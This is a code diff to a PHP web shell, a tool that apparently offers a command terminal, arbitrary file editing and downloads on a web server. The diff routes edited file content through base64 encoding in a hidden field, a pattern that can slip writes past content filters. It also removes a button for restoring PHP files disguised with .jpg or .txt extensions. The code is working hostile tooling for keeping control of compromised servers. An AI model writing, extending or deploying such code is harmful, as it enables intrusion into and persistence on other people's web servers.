@@ -169,10 +169,13 @@ if (isset($_POST['file_to_edit'], $_POST['file_content'])) {
         $errorMsg = 'Edit failed: File not found';
     } elseif (!is_writable($editPath)) {
         $errorMsg = 'Edit failed: File not writable';
-    } elseif (@file_put_contents($editPath, $_POST['file_content']) !== false) {
-        $notification = 'File saved';
     } else {
-        $errorMsg = 'Edit failed: Could not write to file';
+        $decodedContent = base64_decode($_POST['file_content']);
+        if (@file_put_contents($editPath, $decodedContent) !== false) {
+            $notification = 'File saved';
+        } else {
+            $errorMsg = 'Edit failed: Could not write to file';
+        }
     }
 }
 
@@ -936,12 +939,20 @@ if (isset($_POST['terminal_command']) && trim($_POST['terminal_command']) !== ''
             <div class="section-title">Editing: <?= htmlentities($fileToEdit) ?></div>
             <form method="post">
                 <input type="hidden" name="file_to_edit" value="<?= htmlentities($fileToEdit) ?>">
-                <textarea name="file_content"><?= htmlentities($fileContent) ?></textarea>
+                <textarea name="file_content" id="editor-content" style="display:none;"><?= base64_encode($fileContent) ?></textarea>
+                <textarea id="editor-display" style="height: 500px;"><?= htmlentities($fileContent) ?></textarea>
                 <div style="margin-top: 12px;">
-                    <button class="btn btn-primary" type="submit">Save Changes</button>
+                    <button class="btn btn-primary" type="submit" onclick="syncEditorContent()">Save Changes</button>
                 </div>
             </form>
         </div>
+        <script>
+        function syncEditorContent() {
+            var display = document.getElementById('editor-display');
+            var hidden = document.getElementById('editor-content');
+            hidden.value = btoa(unescape(encodeURIComponent(display.value)));
+        }
+        </script>
     <?php endif; ?>
 
     <?php if ($commandAvailable): ?>
@@ -1021,15 +1032,6 @@ if (isset($_POST['terminal_command']) && trim($_POST['terminal_command']) !== ''
                         <form method="post">
                             <button name="edit" value="<?= $item ?>" class="btn btn-sm">Edit</button>
                         </form>
-                        <?php 
-                        $isDisguised = (preg_match('/\.jpg$/i', $item) && strpos($item, '.php') === false) || 
-                                      (preg_match('/\.txt$/i', $item) && preg_match('/\.php[0-9]?\.txt$/i', $item));
-                        if ($isDisguised): 
-                        ?>
-                        <form method="post">
-                            <button name="restore_php" value="<?= $item ?>" class="btn btn-primary btn-sm" onclick="return confirm('Restore to .php extension?')">Restore PHP</button>
-                        </form>
-                        <?php endif; ?>
                     <?php endif; ?>
                         <form method="post">
                             <button name="download" value="<?= $item ?>" class="btn btn-sm">Download</button>
